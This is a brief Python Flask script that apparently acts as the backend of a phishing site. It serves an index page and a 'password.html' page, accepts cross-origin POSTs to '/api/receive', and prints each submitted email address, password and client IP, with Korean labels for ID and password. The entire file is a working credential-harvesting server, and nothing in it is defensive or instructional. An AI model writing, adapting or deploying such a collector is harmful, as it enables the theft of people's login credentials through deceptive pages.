from flask import Flask, request, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder="static")
CORS(app)

@app.route("/index.html")
def page1():
    return send_from_directory("static", "index.html")

@app.route("/password.html")
def page2():
    return send_from_directory("static", "password.html")


@app.post("/api/receive")
def receive():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    
    print("IP:", ip)
    print("아이디:", data.get("email"))
    print("비번", data.get("password"))
    print("=============")

    return {"ok": True}

if __name__ == "__main__":
    app.run()